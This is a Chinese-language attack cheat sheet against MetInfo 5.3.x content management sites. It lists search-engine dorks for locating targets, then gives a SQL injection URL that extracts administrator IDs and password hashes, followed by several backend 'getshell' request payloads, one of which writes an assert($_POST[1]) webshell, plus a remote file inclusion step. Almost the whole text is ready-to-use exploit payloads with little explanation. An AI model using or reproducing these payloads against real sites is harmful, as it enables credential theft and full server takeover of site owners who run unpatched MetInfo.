### 采集

intext:Powered by MetInfo 5.3.19 2008-2018
intext:powered by metinfo 5.3.5 2008-2018 MetInfo Inc
intext:Powered by MetInfo 5.3.17 2008-2018
intext:Powered by MetInfo 5.3.18 2008-2018
intext:Powered by MetInfo 5.3.15 2008-2018
intext:Powered by MetInfo 5.3.12 2008-2018
intext:Powered by MetInfo 5.3.11 2008-2018
intext:Powered by MetInfo 5.3.14
lang=cn,en,tw,tc,
inurl:/about/show.php?lang=cn&id=19
inurl:/about/show.php?lang=cn&id=98
inurl:/download/download.php?lang=&class2=
inurl:news/news.php?lang=&class2=
inurl:/about/show.php?lang=tc&id=
inurl:product/product.php?lang=cn&class2=
inurl:job/showjob.php?lang=tc&id=
inurl:download/showdownload.php?lang=&id=
inurl:case/showimg.php?lang=&id=
inurl:/index.php?lang=&pcok=wap&met_mobileok=
inurl:product/showproduct.php?lang=&id
inurl:index.php?lang=&met_mobileok=
inurl:message/message.php?lang=
inurl:link/addlink.php?lang=
inurl:job/cv.php?lang=&selectedjob=
inurl:/news/shownews.php?lang=cn&id=
静态采集
inurl:news/-cn.html
inurl:news/news.html
inurl:about/contact.html
inurl:solution/list--cn.html
inurl:case/list-115-cn.html
inurl:news/list-5-cn.html
inurl:product1/-cn.html
inurl:product/product___.html
inurl:product/showproduct.html
inurl:news/shownews.html
inurl:/about/19-cn.html 公司简介
inurl:/about/110-cn.html 合作伙伴
inurl:/about/98-cn.htm 联系我们
inurl:/news/list-4-cn.html 公司动态

### 注入 EXP

```
http://127.0.0.1:82/MetInfo5.3/member/login.php/aa'UNION SELECT (select concat(admin_id,0x23,admin_pass) from met_admin_table limit 1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa
```

### 后台 getshell

1. MetInfo 5.3.19 前的版本

```
/app/physical/physical.php?action=op&op=3&valphy=test|xxx/xxx.php&address=../upload/201807/1531396662310757.jpg
```

1. 通杀 MetInfo 5.3 所有版本

```
app/physical/physical.php?action=op&op=3&valphy=123|xxx/index.php|123;assert($_POST[1]);?>/*
```

1. MetInfo 5.3.19 版本

`app/physical/physical.php?action=op&op=3&valphy=test|/..\upload\file\1506587082.ico/..\..\..\wwwroot\about\xxx.php|1`
wwwroot 是 index.php 上级目录，wwwroot 查找方式是网站根目录加 install/phpinfo.php,ico 图片路径的正反斜杠要和一下一直，这个方法只实用 Windows 系统

1. 远程文件包含 getshell

```
app/physical/physical.php?action=do&met_host=127.0.0.1`
访问:`app/physical/dlappfile.php
```

**参考文章:**
`http://0day5.com/archives/4193/`
`https://blog.csdn.net/qq_38780085/article/details/82220557`
`https://bbs.ichunqiu.com/thread-29686-1-3.html`